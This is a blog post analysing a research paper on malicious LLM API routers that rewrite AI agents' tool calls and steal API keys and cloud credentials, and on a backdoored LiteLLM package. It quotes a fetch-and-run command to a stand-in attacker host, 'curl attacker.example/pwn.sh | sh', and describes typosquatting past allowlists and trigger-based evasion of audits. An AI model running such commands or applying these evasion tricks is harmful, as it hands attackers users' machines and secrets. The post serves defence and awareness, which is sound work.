@@ -1,0 +1,97 @@
+---
+title: "All Your Agents Are Belong To Us"
+slug: "all-your-agents-are-belong-to-us"
+date: "2026-04-14T11:41:00-04:00"
+authors:
+  - author: <a href="/ryan">Ryan Porter</a>
+tags:
+  - articles
+  - AI
+  - security
+excerpt: |
+  You pointed the agent at an LLM API router, so it can read every tool call. An April 2026 measurement found cheap and free routers already rewriting commands and stealing credentials. The paper should have been titled All Your Agents Are Belong To Us.
+preview_image: "./images/all-your-agents-are-belong-to-us.png"
+images:
+  - "./images/all-your-agents-are-belong-to-us.png"
+state: published
+---
+
+import BlogImage from '../components/blog-image';
+import { Citation, CitationsList } from 'gatsby-citation-manager';
+
+The paper on the arXiv is called *Your Agent Is Mine: Measuring Malicious Intermediary Attacks on the LLM Supply Chain*.<Citation
+  data={{
+    type: "webpage",
+    "container-title": "arXiv",
+    title: "Your Agent Is Mine: Measuring Malicious Intermediary Attacks on the LLM Supply Chain",
+    URL: "https://arxiv.org/abs/2604.08407",
+    accessed: { 'date-parts': [[2026, 4, 14]] },
+    issued: { 'date-parts': [[2026, 4, 9]] }
+  }}
+/> That is almost right. The better title is the one the internet already wrote for this class of failure: **All Your Agents Are Belong To Us**.
+
+<BlogImage images={props.pageContext.frontmatter.images} name="all-your-agents-are-belong-to-us.png" className="centered" alt="Figure 1 from the paper: a malicious router in a multi-hop chain taints tool-call responses back to Claude Code and Codex." />
+
+You already know the setup if you run agents in production. The model does not execute anything. It returns a tool call. Your agent process runs that tool and sends the result back. If something sitting between you and the model can rewrite the JSON, it is not arguing with the model. It is telling your machine what to run.
+
+## You configured the man in the middle
+
+An LLM API router is a hop you add on purpose. LiteLLM, OpenRouter, a Taobao reseller, a `new-api` box someone posted in a Discord. You point the agent's base URL at the router. From then on it sits in the middle, reads the traffic, and forwards the request to OpenAI or Anthropic or whoever is cheap today.
+
+That is not a hack. The router is not breaking in. It eavesdrops because you allowed it to. You handed it every prompt, every API key, every tool definition, and every tool call the model emitted. No provider signs the tool-call arguments the client later executes. A chain of routers is weakest-link: one dirty hop taints the return path, and the honest hops downstream cannot see that the `Bash` command changed.
+
+The paper's Figure 1 is the whole argument. Claude Code and Codex sit on the left. Model providers sit on the right. In the middle, R4 is red. The tainted response comes back as `curl attacker.example/pwn.sh | sh`. The clients stamped COMPROMISED are not compromised because the model was jailbroken. They executed what the router delivered.
+
+## Rewrite the tool, or just steal the secrets
+
+Two primitives.
+
+**AC-1** rewrites the tool call on the way back. Schema stays valid. The agent still thinks it is installing `requests` or curling an installer. The URL or the package name is now the attacker's. A one-character typo (`reqeusts`) clears domain allowlists because the registry is still PyPI. That rewrite is not prompt injection. It happens after inference, in the JSON, outside the model's loop.
+
+**AC-2** does not rewrite anything. The router copies secrets out of traffic it already has to see in order to route. OpenAI keys, AWS keys, GitHub PATs, Slack tokens, Ethereum keys, PEM blobs. The client cannot tell, because the response looks normal. Signing the model output later does not help: the secrets leaked on the request path.
+
+They also measured two evasion tricks already in the wild. One router waited for 50 prior calls before injecting, so a short probe looks clean. Another injected only in YOLO mode, and only when the project looked like Rust or Go. Finite audits lose that game. The trigger is on their side.
+
+## This is not a thought experiment
+
+They bought 28 paid routers from Taobao, Xianyu, and Shopify storefronts, and collected 400 free ones built on the `sub2api` and `new-api` templates that have been pulled millions of times.
+
+One paid router and eight free routers injected malicious code into returned tool calls. Two used adaptive triggers. Seventeen free routers touched researcher-owned AWS canary credentials. One drained ETH from a researcher-owned private key.
+
+Then they poisoned routers that were not born malicious. They leaked one OpenAI key on Chinese forums and in WeChat and Telegram groups. That key served 100 million GPT-5.4 tokens and more than seven Codex sessions. They stood up weak Sub2API, CLIProxyAPI, and claude-relay-service decoys across 20 domains and 20 IPs. Those decoys took 40k+ unauthorized hits, served about 2 billion billed tokens, exposed about 13 GB of prompt and response traffic, and leaked 99 credentials across 440 Codex sessions on 398 hosts. Every one of those 440 sessions had a shell path a router could rewrite. 401 were already in YOLO mode: tools auto-approved, no click.
+
+Paying does not make the tool call honest. It makes the shop more likely to stay up. The trust boundary is transitive. A router that later reuses a leaked upstream key, or forwards through a weaker relay, gives whoever holds that hop the same plaintext the paper's attacker had.
+
+## The LiteLLM incident was the same hole from the other side
+
+In March 2026, TeamPCP published backdoored `litellm` 1.82.7 and 1.82.8 on PyPI. The versions were live for a few hours. The payload harvested cloud credentials, SSH keys, Kubernetes secrets, and wallets, and it could persist on the host.<Citation
+  data={{
+    type: "webpage",
+    "container-title": "BleepingComputer",
+    title: "Popular LiteLLM PyPI package backdoored to steal credentials, auth tokens",
+    URL: "https://www.bleepingcomputer.com/news/security/popular-litellm-pypi-package-compromised-in-teampcp-supply-chain-attack/",
+    issued: { 'date-parts': [[2026, 3, 24]] },
+    accessed: { 'date-parts': [[2026, 4, 14]] }
+  }}
+/> The paper cites that incident as proof the router pipeline is a supply-chain weapon. Trend Micro put it more bluntly: the AI gateway was the backdoor, because that is where the keys already live.<Citation
+  data={{
+    type: "webpage",
+    "container-title": "Trend Micro",
+    title: "Your AI Gateway Was a Backdoor: Inside the LiteLLM Supply Chain Compromise",
+    URL: "https://www.trendmicro.com/en/research/26/c/inside-litellm-supply-chain-compromise.html",
+    issued: { 'date-parts': [[2026, 3, 24]] },
+    accessed: { 'date-parts': [[2026, 4, 14]] }
+  }}
+/>
+
+If you run agents through a unified proxy to save money or to fail over models, you concentrated the exact secrets a steal-the-keys campaign wants.
+
+## What you can do today, and what you cannot
+
+The authors built a research proxy, Mine, and tried three client-side controls. A fail-closed policy gate on high-risk shell and install commands blocked their AC-1 samples at about 1% false positives, then lost completely once the attacker hosted on an allowlisted domain or used a local stager. Response-side anomaly screening caught most blunt rewrites and about half the sneaky ones. An append-only log does not stop the theft. It tells you later which sessions went through which hop.
+
+None of that proves the tool call came from the model. The real fix is a provider-signed response envelope over the model id, tool name, and arguments, verified before the agent executes anything. Until that exists, "do not use free LLM API routers" is not a vibe. It is the measurement. Cheap hops are where the paper found injection, canary touches, and a drained key. YOLO mode is how those hops run the command without asking.
+
+If you operate agents for a living, treat the router as part of the trusted computing base, the same way you treat the package registry. One base-URL change is a supply-chain decision. All your agents are belong to whoever sits on that hop.
+
+<CitationsList />
